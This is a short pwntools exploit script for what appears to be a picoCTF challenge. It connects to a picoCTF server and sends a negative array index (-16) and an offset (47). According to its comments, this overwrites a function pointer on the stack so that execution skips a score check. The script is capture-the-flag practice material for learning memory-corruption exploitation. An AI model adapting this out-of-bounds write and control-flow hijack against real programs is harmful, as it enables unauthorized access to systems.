#!/usr/bin/env python3
from pwn import *

story = b'\x41' # irrelevant

#p = process('./vuln')
#gdb.attach(p, '''
#b *0x8049614
#b *0x080492fc
#b *0x08049320
#b *0x80492eb
#c
#''')
p = remote('saturn.picoctf.net', 65429)
print(p.recvuntil(b'>> ').decode('utf-8'))
p.sendline(story)
print(p.recvuntil(b'10.\n').decode('utf-8'))
p.sendline(b'-16') # overwrite addr 16*4 bytes before fun[0] on the stack
p.sendline(b'47') # add 47 (0x2f) to the stored func addr - this will skip past the "if (calculate_story_score(story, len) == 13371337)" check
print(p.recv().decode('utf-8'))